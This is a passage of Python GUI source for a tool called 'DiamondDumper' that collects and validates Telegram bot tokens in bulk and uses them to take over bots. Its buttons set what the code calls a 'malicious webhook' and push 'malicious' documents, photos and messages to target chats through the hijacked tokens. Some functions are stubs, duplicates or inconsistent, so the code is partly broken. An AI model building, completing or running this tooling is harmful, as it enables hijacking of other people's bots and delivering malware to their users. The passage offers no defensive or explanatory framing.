        cursor = conn.cursor()
    
        try:
            # Create the table if it doesn't exist
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS bot_table (
                    id INTEGER PRIMARY KEY,
                    token TEXT,
                    botname TEXT,
                    status TEXT,
                    submission_date TEXT,
                    last_checked_date TEXT,
                    last_dumped_date TEXT
                )
            ''')
    
            # Insert the information into the table
            cursor.execute('''
                INSERT INTO bot_table (token, botname, status, submission_date, last_checked_date, last_dumped_date)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (bot_link, bot_username, status, submission_date, last_checked_date, last_dumped_date))
    
            # Fetch all the bot information from the table
            cursor.execute('SELECT * FROM bot_table')
            bot_data = cursor.fetchall()
    
            # Update the tableWidget with the new bot information
            self.tableWidget.setRowCount(len(bot_data))
            for row, bot_info in enumerate(bot_data):
                for col, info in enumerate(bot_info):
                    item = QtWidgets.QTableWidgetItem(str(info))
                    self.tableWidget.setItem(row, col, item)
    
            # Commit the changes and close the connection
            conn.commit()
            conn.close()
    
            # Return the newly added bot link
            return bot_link
        except:
            # Handle any exceptions that may occur during the database operation
            return None
                
def import_bulk_tokens():
    file_dialog = QFileDialog()
    file_path, _ = file_dialog.getOpenFileName(None, "Select Text File", "", "Text Files (*.txt)")
    if file_path:
        with open(file_path, 'r') as file:
            tokens = file.read().splitlines()
        
        # Process the tokens and import them to your_database.db
        for token in tokens:
            # Import the token to the database
            pass
    else:
        QMessageBox.critical(None, "Error", "No file selected.")


def send_status_update(chat_id, bot_token):
    # Send a status update message to the user
    response = requests.get(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                            params={'chat_id': chat_id, 'text': "Status update"})
    
    if response.status_code != 200:
        error_message = f"Error sending status update using {bot_token}"
        QMessageBox.critical(None, "Error", error_message)

def sync_button_clicked(self):
    try:
        chat_id = self.ui.telegram_chat_id_text_input.toPlainText()
        bot_token = self.bot_manager_text_input.toPlainText()

        # Connect to the bot manager and send a status update
        send_status_update(chat_id, bot_token)

        # Start the bot's event loop
        dp.start_polling()
    except Exception as e:
        error_message = f"⚠️ Error occurred while executing the sync operation: {str(e)}"
        QMessageBox.critical(None, "Error", error_message)


def send_response_console(self):
    if hasattr(self, 'ui') and hasattr(self.ui, 'tableWidget') and hasattr(self, 'menuConsole_Screen'):
        selected_items = self.ui.tableWidget.selectedItems()
        if selected_items:
            token = selected_items[0].text()
            chat_id = "your_target_chat_id"  # Replace with the target chat ID
            message = self.console_text_response_input.text()
            
            response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                                    data={'chat_id': chat_id, 'text': message})
            if response.status_code == 200:
                console_text = f"Send Response button clicked - Sending response message to {chat_id} using {token}..."
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
                self.menuConsole_Screen.addAction(f"Response: {message}")
            else:
                console_text = f"Error sending response message using {token}"
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
        else:
            error_message = "Please select a bot token from the table"
            QMessageBox.critical(None, "Error", error_message)
    else:
        error_message = "There is no selected token from the table storage."
        QMessageBox.critical(None, "Error", error_message)



 #/////// Inital Bot Control Functions for the Bot that you will manage from @BotFather
 #////// So Syncing Your Bots... Enabling Listening Mode... Checking Status... Users... Etc



async def send_status_update(chat_id: int, bot_token: str):
    bot = Bot(token=bot_token)
    await bot.send_message(chat_id, "Bot Online")



@dp.message_handler()
async def handle_message(message: types.Message):
    # Handle incoming messages based on message text or other conditions
    if message.text == '/hello':
        await message.reply("Hello, how can I assist you?")
    elif message.text == '/help':
        await message.reply("This is a help message.")
    else:
        await message.reply("Sorry, I couldn't understand your message.")





def save_token(self):
    token = self.token_entry.text().strip()
    if not token:
        QMessageBox.warning(self, "Error", "Please enter a token")
        return
    response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
    if response.status_code == 200:
        data = json.loads(response.text)
        bot_name = data['result']['username']
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        row_count = self.table.rowCount()
        self.table.insertRow(row_count)
        self.table.setItem(row_count, 0, QTableWidgetItem(token))
        self.table.setItem(row_count, 1, QTableWidgetItem(bot_name))
        self.table.setItem(row_count, 2, QTableWidgetItem(current_time))
        self.table.setItem(row_count, 3, QTableWidgetItem(current_time))
        self.table.setItem(row_count, 4, QTableWidgetItem("Valid"))
    else:
        QMessageBox.warning(self, "Error", "Invalid token")
    # Clear the entry field after saving
    self.token_entry.clear()
    
    
    
def submit_token(self):
    token = self.token_entry.text().strip()
    if not token:
        QMessageBox.warning(self, "Error", "Please enter a token")
        return
    self.save_token()
    
    
    
    
    
def import_bulk_tokens(self):
    # Implement file dialog to open a text file containing tokens
    # ... (Code for opening the file and getting tokens from the file)
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(self.save_token_entry, token) for token in tokens]
        for future in futures:
            future.result()
            
            
            
            
def save_token_entry(self, token):
    response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
    if response.status_code == 200:
        data = json.loads(response.text)
        bot_name = data['result']['username']
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        row_count = self.table.rowCount()
        self.table.insertRow(row_count)
        self.table.setItem(row_count, 0, QTableWidgetItem(token))
        self.table.setItem(row_count, 1, QTableWidgetItem(bot_name))
        self.table.setItem(row_count, 2, QTableWidgetItem(current_time))
        self.table.setItem(row_count, 3, QTableWidgetItem(current_time))
        self.table.setItem(row_count, 4, QTableWidgetItem("Valid"))
    else:
        print(f"Invalid token: {token}")
        
        
        
        
        
def start_process(self):
    # Start the background task in a separate thread
    self.background_thread = threading.Thread(target=self.background_task)
    self.background_thread.daemon = True  # Set the thread as a daemon to exit when the main program ends
    self.background_thread.start()
    # Example: Print a message when the process starts
    print("Process started")
    
    
    
    
    
def stop_process(self):
    self.stop_flag.set()
    print("Listening Stopped...")
    
    
    
def background_task(self):
    while not self.stop_flag.is_set():
        # Example: Check for new incoming documents or messages
        for row in range(self.table.rowCount()):
            token = self.table.item(row, 0).text()
            # Example: Check for new incoming documents or messages for each bot token
            if self.check_for_new_documents(token):
                # Update the table view with a red indicator
                # ... (Code to update the table cell)
                pass
        # Pause for 5 seconds before checking again
        time.sleep(5)



 #/////// This is the button grouping to the right of the response console that will
 #////// Enable you to control the selected token from the table widget of your choosing



def start_button_clicked(self):
    console_text = "Start button clicked - Initiating malicious action..."
    
    try:
        # Establish a connection to the database
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()

        # Fetch all the bot information from the table
        cursor.execute('SELECT * FROM bot_table')
        bot_data = cursor.fetchall()

        # Update the tableWidget with the bot information
        self.tableWidget.setRowCount(len(bot_data))
        self.tableWidget.setColumnCount(len(bot_data[0]))  # Assuming all rows have the same number of columns
        for row, bot_info in enumerate(bot_data):
            for col, info in enumerate(bot_info):
                item = QtWidgets.QTableWidgetItem(str(info))
                self.tableWidget.setItem(row, col, item)

        # Commit the changes and close the connection
        conn.commit()
        conn.close()
        
        # Append console text to sub_console_frame_text
        self.sub_console_frame_text.appendPlainText(console_text)
    except sqlite3.Error as e:
        # Handle the exception by displaying an error message in a QMessageBox
        error_message = f"An error occurred while accessing the database:\n\n{str(e)}\n\nTraceback:\n\n{traceback.format_exc()}"
        QMessageBox.critical(self, "Database Error", error_message)


def stop_button_clicked(self):
    console_text = "Stop button clicked - Halting malicious action..."
    self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
    self.menuConsole_Screen.addAction(console_text)
    # Add your logic to stop the malicious action
    # Example: Stop sending messages, remove a webhook, etc.
    
    
def setWebhook_button_clicked(self):
    if hasattr(self, 'tableWidget'):
        selected_items = self.tableWidget.selectedItems()
        if selected_items:
            token = selected_items[0].toPlainText()
            url = "https://api.telegram.org/bot{token}/getMe"  # Replace with your malicious webhook URL
            response = requests.post(f"https://api.telegram.org/bot{token}/setWebhook?url={url}")
            if response.status_code == 200:
                console_text = f"Set Webhook button clicked - Setting up malicious webhook for {token}..."
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
            else:
                console_text = f"Error setting webhook for {token}"
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
        else:
            error_message = "Please select a bot token from the table."
            QMessageBox.critical(None, "Error", error_message)
    else:
        error_message = "tableWidget attribute is not found."
        QMessageBox.critical(None, "Error", error_message)







def sendDocument_button_clicked(self):
    selected_items = self.ui.tableWidget.selectedItems()
    if selected_items:
        token = selected_items[0].toPlainText()
        chat_id = "your_target_chat_id" # Replace with the target chat ID
        document_path = "path/to/malicious/document.pdf" # Replace with the path to the malicious document
        files = {'document': open(document_path, 'rb')}
        response = requests.post(f"https://api.telegram.org/bot{token}/sendDocument",
                                data={'chat_id': chat_id}, files=files)
        if response.status_code == 200:
            console_text = f"Send Docs button clicked - Sending malicious document to {chat_id} using {token}..."
            self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
            self.menuConsole_Screen.addAction(console_text)
            self.display_response(console_text)  # Display the response in sub_console_frame
        else:
            console_text = f"Error sending document using {token}"
            self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
            self.menuConsole_Screen.addAction(console_text)
            self.display_response(console_text)  # Display the response in sub_console_frame
    else:
        console_text = "Please select a bot token from the table"
        self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
        self.menuConsole_Screen.addAction(console_text)
        self.display_response(console_text)  # Display the response in sub_console_frame

def display_response(self, response):
    self.sub_console_frame.append(response)






def getME_button_clicked(self):
    selected_items = self.ui.tableWidget.selectedItems()
    if selected_items:
        token = selected_items[0].text()
        response = requests.get(f"https://api.telegram.org/bot{token}/getMe")
        if response.status_code == 200:
            data = response.json()
            console_text = f"Get Me button clicked - Retrieved information for {token}:"
            console_text += f"\nUsername: {data['result']['username']}"
            console_text += f"\nFirst Name: {data['result']['first_name']}"
            console_text += f"\nLast Name: {data['result']['last_name'] if 'last_name' in data['result'] else ''}"
            self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
            self.menuConsole_Screen.addAction(console_text)
        else:
            console_text = f"Error retrieving information for {token}"
            self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
            self.menuConsole_Screen.addAction(console_text)
    else:
        console_text = "Please select a bot token from the table"
        self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
        self.menuConsole_Screen.addAction(console_text)


def sendPhoto_button_clicked(self):
    if hasattr(self, 'ui') and hasattr(self.ui, 'tableWidget') and hasattr(self, 'menuConsole_Screen'):
        selected_items = self.ui.tableWidget.selectedItems()
        if selected_items:
            token = selected_items[0].text()
            chat_id = "your_target_chat_id" # Replace with the target chat ID
            photo_path = "path/to/malicious/photo.jpg" # Replace with the path to the malicious photo
            files = {'photo': open(photo_path, 'rb')}
            response = requests.post(f"https://api.telegram.org/bot{token}/sendPhoto",
                                    data={'chat_id': chat_id}, files=files)
            if response.status_code == 200:
                console_text = f"Send Photo button clicked - Sending malicious photo to {chat_id} using {token}..."
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
            else:
                console_text = f"Error sending photo using {token}"
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
        else:
            error_message = "Please select a bot token from the table"
            QMessageBox.critical(None, "Error", error_message)
    else:
        error_message = "No selected token from the table database."
        QMessageBox.critical(None, "Error", error_message)


def sendMessage_button_clicked(self):
    if hasattr(self, 'ui') and hasattr(self.ui, 'tableWidget') and hasattr(self, 'menuConsole_Screen'):
        selected_items = self.ui.tableWidget.selectedItems()
        if selected_items:
            token = selected_items[0].text()
            chat_id = "your_target_chat_id" # Replace with the target chat ID
            message = "This is a malicious message"
            response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                                    data={'chat_id': chat_id, 'text': message})
            if response.status_code == 200:
                console_text = f"Send Msgs button clicked - Sending malicious message to {chat_id} using {token}..."
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
            else:
                console_text = f"Error sending message using {token}"
                self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
                self.menuConsole_Screen.addAction(console_text)
        else:
            error_message = "Please select a bot token from the table"
            QMessageBox.critical(None, "Error", error_message)
    else:
        error_message = "No bot has been selected from the table database."
        QMessageBox.critical(None, "Error", error_message)


def set_privacy_button_clicked(self):
    if hasattr(self, 'menuConsole_Screen'):
        self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
        self.menuConsole_Screen.addAction("Set Privacy button clicked - Adjusting privacy settings maliciously...")
    else:
        error_message = "menuConsole_Screen attribute is not found."
        QMessageBox.critical(None, "Error", error_message)

def pushButton_7_clicked(self):
    if hasattr(self, 'menuConsole_Screen'):
        self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
        self.menuConsole_Screen.addAction("PushButton 7 clicked - Performing undisclosed action...")
    else:
        error_message = "menuConsole_Screen attribute is not found."
        QMessageBox.critical(None, "Error", error_message)

def pushButton_8_clicked(self):
    if hasattr(self, 'menuConsole_Screen'):
        self.menuConsole_Screen.setTitle(_translate("DiamondDumper", "Console Screen"))
        self.menuConsole_Screen.addAction("PushButton 8 clicked - Executing secretive operation...")
    else:
        error_message = "menuConsole_Screen attribute is not found."
        QMessageBox.critical(None, "Error", error_message)







 #/////// END OF GROUPING FUNCTIONS
 #////// END OF GROUPING FUNCTIONS






if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    DiamondDumper = QtWidgets.QMainWindow()
    ui = Ui_DiamondDumper()
    ui.setupUi(DiamondDumper)
    DiamondDumper.show()
    sys.exit(app.exec_())


